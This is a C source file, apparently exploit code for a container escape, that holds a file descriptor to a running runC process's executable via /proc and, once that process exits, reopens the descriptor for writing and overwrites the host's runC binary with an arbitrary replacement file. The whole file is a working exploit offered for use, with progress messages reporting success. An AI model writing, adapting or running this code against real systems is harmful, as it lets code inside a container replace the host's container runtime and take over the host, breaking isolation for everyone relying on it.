#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#include <stdlib.h>
#include <string.h>
#include <stdio.h>

/* Simple Buffer*/
typedef struct Buffer
{
	int len;		// buffer length
	void * buff;	// buffer data
} Buffer;

#define FALSE 0
#define TRUE  1


const char * DEFAULT_NEW_RUNC_PATH = "/new_runc";

const unsigned int PATH_MAX_LEN = 30;

const int OPEN_ERR = -1;
const int RET_ERR = 1;
const int RET_OK = 0;

const long WRITE_TIMEOUT = 99999999999999999;

Buffer read_new_runc(char * new_runc_path);


/*
* Usage: overwrite_runc </proc/runc_pid/exe> <new runc path>
* Overwrites the runC binary.
*/
int main(int argc, char *argv[])
{
	int runc_fd_read, my_runc_fd, wc;
	char my_runc_fd_path[PATH_MAX_LEN];
	char * new_runc_path;                    	 // path to file to replace runc
	char * runc_exe_path;
	Buffer new_runc;

	if (argc == 1 || argc > 3)
	{
		printf("Usage: %s </proc/runc_pid/exe> <new runc path>\n", argv[0]);
		return RET_ERR;
	}

	/* Open /proc/runc_pid/exe for reading */
	runc_exe_path = argv[1];
	runc_fd_read = open(runc_exe_path, O_RDONLY);
	if (runc_fd_read == OPEN_ERR)
	{
		printf("[!] Couldn't open runC's exe %s\n", runc_exe_path);
		perror("[!] Open");
		return RET_ERR;
	}
	printf("[+] Got %s as fd %d in this process\n", runc_exe_path, runc_fd_read);


	/* Read new_runc */
	if (argc < 3)
		new_runc_path = DEFAULT_NEW_RUNC_PATH;
	else
		new_runc_path = argv[2];
	new_runc = read_new_runc(new_runc_path);
	if (new_runc.buff == NULL)
	{
		close(runc_fd_read);
		return RET_ERR;
	}
	printf("[+] Read %d bytes from new runC\n", new_runc.len);

	/* Try to open /proc/self/fd/runc_fd_read for writing */
	/* Will Succeed after the runC process exits          */
	sprintf(my_runc_fd_path, "/proc/self/fd/%d", runc_fd_read);
	int opened = FALSE;
	for (long count = 0; (!opened && count < WRITE_TIMEOUT); count++)
	{
		my_runc_fd = open(my_runc_fd_path, O_WRONLY | O_TRUNC);
		if (my_runc_fd != OPEN_ERR)
		{
			wc = write(my_runc_fd, new_runc.buff, new_runc.len);
			if (wc !=  new_runc.len)
			{
				printf("[!] Couldn't write to my process's runC's fd %s\n", my_runc_fd_path);
				close(my_runc_fd);
				close(runc_fd_read);
				free(new_runc.buff);
				return RET_ERR;
			}
			printf("[+] Opened runC (using %s) for writing\n", my_runc_fd_path);
			printf("[+] Succesfully overwritten runC\n");
			opened = TRUE;
		}
	}

	/* Clean ups & return */
	close(my_runc_fd);
	close(runc_fd_read);
	free(new_runc.buff);
	if (opened == FALSE)
	{
		printf("[!] Reached timeout, couldn't write to runc at %s\n", my_runc_fd_path);
		return RET_ERR;
	}
	else
		printf("[+] Done, shuting down ...\n");

	fflush(stdout);
	return RET_OK;

}


/*
* Reads from the file at new_runc_path, returns a Buffer with new_runc's content.
*/
Buffer read_new_runc(char * new_runc_path)
{
	Buffer new_runc = {0, NULL};
	FILE *fp_new_runc;
	int file_size, rc;
	void * new_runc_content;
	char ch;

	// open new_Runc
	fp_new_runc = fopen(new_runc_path, "r"); // read mode
	if (fp_new_runc == NULL)
	{
	  printf("[!] open file err while opening the new runc file %s\n", new_runc_path);
	  return new_runc;
	}

	// Get file size and prepare buff
	fseek(fp_new_runc, 0L, SEEK_END);
	file_size = ftell(fp_new_runc);
	new_runc_content = malloc(file_size);
	rewind(fp_new_runc);

	rc = fread(new_runc_content, 1, file_size, fp_new_runc);
	if (rc != file_size)
	{
		printf("[!] Couldn't read from new runc file at %s\n", new_runc_path);
		free(new_runc_content);
		return new_runc;
	}

	fclose(fp_new_runc);
	new_runc.len = rc;
	new_runc.buff = new_runc_content;
	return new_runc;

}